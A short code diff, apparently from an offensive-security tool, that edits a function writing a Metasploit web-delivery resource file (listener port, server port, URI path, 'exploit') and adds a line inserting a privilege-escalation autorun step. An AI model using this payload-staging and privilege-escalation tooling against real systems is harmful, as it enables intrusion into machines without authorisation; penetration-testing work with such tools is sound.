@@ -266,6 +266,7 @@ def _write_web_delivery_rc(payload, target_index):
                     "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
                     "set srvport " + str(settings.SRVPORT) + settings.END_LINE.LF +
                     "set uripath " + settings.URIPATH + settings.END_LINE.LF +
+                    checks.priv_esc_autorun_line(payload) +
                     "exploit" + settings.END_LINE.LF * 2)
   return output
 
